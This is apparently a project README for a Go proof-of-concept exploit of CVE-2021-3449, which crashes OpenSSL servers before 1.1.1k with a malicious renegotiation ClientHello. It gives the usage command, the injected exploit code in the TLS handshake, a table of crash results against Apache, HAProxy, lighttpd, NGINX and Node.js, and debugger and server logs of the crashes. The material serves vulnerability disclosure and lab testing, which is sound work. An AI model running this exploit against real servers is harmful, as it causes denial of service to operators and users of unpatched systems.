# CVE-2021-3449 OpenSSL <1.1.1k DoS exploit

Usage: `go run . -host hostname:port`

This program implements a proof-of-concept exploit of CVE-2021-3449
affecting OpenSSL servers pre-1.1.1k if TLSv1.2 secure renegotiation is accepted.

It connects to a TLSv1.2 server and immediately initiates an RFC 5746 "secure renegotiation".
The attack involves a maliciously-crafted `ClientHello` that causes the server to crash
by causing a NULL pointer dereference (Denial-of-Service).

## References

- [OpenSSL security advisory](https://www.openssl.org/news/secadv/20210325.txt)
- [cve.mitre.org](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3449)
- [Ubuntu security notice](https://ubuntu.com/security/notices/USN-4891-1) (USN-4891-1)
- [Debian security tracker](https://security-tracker.debian.org/tracker/CVE-2021-3449)
- [Red Hat CVE entry](https://access.redhat.com/security/cve/CVE-2021-3449)

> This issue was reported to OpenSSL on 17th March 2021 by Nokia. The fix was
> developed by Peter Kästle and Samuel Sapalski from Nokia.

## Mitigation

The only known fix is to update `libssl1.1`.

Even though some applications use hardened TLS configurations by default that disable TLS renegotiation,
they are still affected by the bug if running an old OpenSSL version.

## Exploit

`main.go` is a tiny script that connects to a TLS server, forces a renegotiation, and disconnects.

The exploit code was injected into a bundled version of the Go 1.14.15 `encoding/tls` package.
You can find it in `handshake_client.go:115`. The logic is self-explanatory.

```go
// CVE-2021-3449 exploit code.
if hello.vers >= VersionTLS12 {
    if c.handshakes == 0 {
        println("sending initial ClientHello")
        hello.supportedSignatureAlgorithms = supportedSignatureAlgorithms
    } else {
        // OpenSSL pre-1.1.1k runs into a NULL-pointer dereference
        // if the supported_signature_algorithms extension is omitted,
        // but supported_signature_algorithms_cert is present.
        println("sending malicious ClientHello")
        hello.supportedSignatureAlgorithmsCert = supportedSignatureAlgorithms
    }
}
```

– [@terorie](https://github.com/terorie)

## Demo

The `demo/` directory holds configuration to patch various apps with a vulnerable version of OpenSSL.

Test setup:
- Download and compile the vulnerable OpenSSL 1.1.1j version locally
- Prepare an Ubuntu 20.04 target container and upload the OpenSSL libraries
- Install application onto target container
- Start server and execute attack

Requirements:
- OpenSSL (on the host)
- `build-essential` (Perl, GCC, Make)
- Docker

**Note: None of the listed web servers are vulnerable to CVE-2021-3449 with OpenSSL 1.1.1k or later.**

| Server                                       | Distro       | Version | Demo                 | Result        |
| -------------------------------------------- | ------------ | ------- | -------------------- | ------------- |
| [OpenSSL s_server](#openssl-simple-server)   | -            | 1.1.1j  | `make demo-openssl`  | Crash         |
| [Apache2](#apache2-httpd)                    | Ubuntu 18.04 | 2.4.29  | `make demo-apache2`  | Partial crash |
| [HAProxy](#haproxy)                          | Ubuntu 18.04 | 1.8.8   | `make demo-haproxy`  | Crash         |
| [HAProxy](#haproxy)                          | Ubuntu 20.04 | 2.0.13  | `make demo-haproxy`  | No effect     |
| [lighttpd](#lighttpd)                        | Ubuntu 18.04 | 1.4.55  | `make demo-lighttpd` | Crash         |
| [lighttpd](#lighttpd)                        | Ubuntu 20.04 | 1.4.55  | `make demo-lighttpd` | Crash         |
| [lighttpd](#lighttpd)                        | Ubuntu 21.04 | 1.4.59  | `make demo-lighttpd` | No effect with config option |
| [NGINX](#nginx)                              | Ubuntu 18.04 | 1.14.0  | `make demo-nginx`    | Partial crash |
| [NGINX](#nginx)                              | Ubuntu 20.04 | 1.18.0  | `make demo-nginx`    | No effect     |
| Node.js <=12                                 | Ubuntu 18.04 |         |                      | No effect     |
| [Node.js >12](#nodejs)                       | Ubuntu 18.04 | ?       | `make demo-nodejs`   | Crash         |
| [Node.js >12](#nodejs)                       | Ubuntu 18.04 | 15.14.0 | `make demo-nodejs`   | No effect     |

To clean up all demo resources, run `make clean`.

### OpenSSL simple server

The `openssl s_server` is a minimal TLS server implementation.

* `make demo-openssl`: Full run (port 4433)
* `make -C demo build-openssl`: Build target Docker image
* `make -C demo start-openssl`: Start target at port 4433
* `make -C demo stop-openssl`: Stop target

Result: Full server crash.

**Logs**

```
docker run -d -it --name cve-2021-3449-openssl --network host local/cve-2021-3449/openssl
a16c44f98a37b7e0c0777d3bd66456203de129fd23566d2141ef2bec9777be17
docker logs -f cve-2021-3449-openssl &
sleep 2
warning: Error disabling address space randomization: Operation not permitted
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Using default temp DH parameters
ACCEPT
sending initial ClientHello
connected
sending malicious ClientHello

[[truncated]]

Program received signal SIGSEGV, Segmentation fault.
0x00007f668bd89283 in tls12_shared_sigalgs () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
#0  0x00007f668bd89283 in tls12_shared_sigalgs () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
#1  0x00007f668bd893cd in tls1_set_shared_sigalgs () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
#2  0x00007f668bd89fe3 in tls1_process_sigalgs () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
#3  0x00007f668bd8a110 in tls1_set_server_sigalgs () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
#4  0x00007f668bd824a2 in tls_early_post_process_client_hello () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
#5  0x00007f668bd84d55 in tls_post_process_client_hello () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
#6  0x00007f668bd8522f in ossl_statem_server_post_process_message () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
#7  0x00007f668bd710e1 in read_state_machine () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
#8  0x00007f668bd7199d in state_machine () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
#9  0x00007f668bd71c4e in ossl_statem_accept () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
#10 0x00007f668bd493ab in ssl3_read_bytes () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
#11 0x00007f668bd504ec in ssl3_read_internal () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
#12 0x00007f668bd50595 in ssl3_read () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
#13 0x00007f668bd5ae5c in ssl_read_internal () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
#14 0x00007f668bd5af5b in SSL_read () from /usr/lib/x86_64-linux-gnu/libssl.so.1.1
#15 0x000055aa5a10f209 in sv_body ()
#16 0x000055aa5a1302ec in do_server ()
#17 0x000055aa5a114815 in s_server_main ()
#18 0x000055aa5a0f9395 in do_cmd ()
#19 0x000055aa5a0f9ee1 in main ()
malicious handshake failed, exploit might have worked
```

### Apache2 httpd

Apache2 `httpd` web server with default configuration is vulnerable.

* `make demo-apache`: Full run (port 443)
* `make -C demo build-apache`: Build target Docker image
* `make -C demo start-apache`: Start target at port 443
* `make -C demo stop-apache`: Stop target

Thank you to [@binarytrails](https://github.com/binarytrails) for the contribution.

Result: Partial disruption, main process still alive but worker process crashed.

**Logs**

```
docker run -d -it --name cve-2021-3449-apache2 --network host local/cve-2021-3449/apache2
0bf38dd8ab721f0ae3713448d2a28050b6e7d11fa7e3174b6ec9b1bbcfa124c8
docker logs -f cve-2021-3449-apache2 &

[[truncated]]

sending initial ClientHello
connected
sending malicious ClientHello
[Sat Mar 27 02:54:38.153327 2021] [ssl:info] [pid 21:tid 140433175750400] [client 127.0.0.1:46846] AH01964: Connection to child 64 established (server localhost:443)
[Sat Mar 27 02:54:38.153619 2021] [ssl:debug] [pid 21:tid 140433175750400] ssl_engine_kernel.c(2317): [client 127.0.0.1:46846] AH02043: SSL virtual host for servername localhost found
[Sat Mar 27 02:54:38.155697 2021] [ssl:debug] [pid 21:tid 140433175750400] ssl_engine_kernel.c(2233): [client 127.0.0.1:46846] AH02041: Protocol: TLSv1.2, Cipher: ECDHE-RSA-CHACHA20-POLY1305 (256/256 bits)
[Sat Mar 27 02:54:38.155781 2021] [ssl:error] [pid 21:tid 140433175750400] [client 127.0.0.1:46846] AH02042: rejecting client initiated renegotiation
[Sat Mar 27 02:54:38.155837 2021] [ssl:debug] [pid 21:tid 140433175750400] ssl_engine_kernel.c(2317): [client 127.0.0.1:46846] AH02043: SSL virtual host for servername localhost found
malicious handshake failed, exploit might have worked: EOF
[Sat Mar 27 02:54:39.183129 2021] [core:notice] [pid 19:tid 140433267538880] AH00051: child pid 21 exit signal Segmentation fault (11), possible coredump in /etc/apache2
```

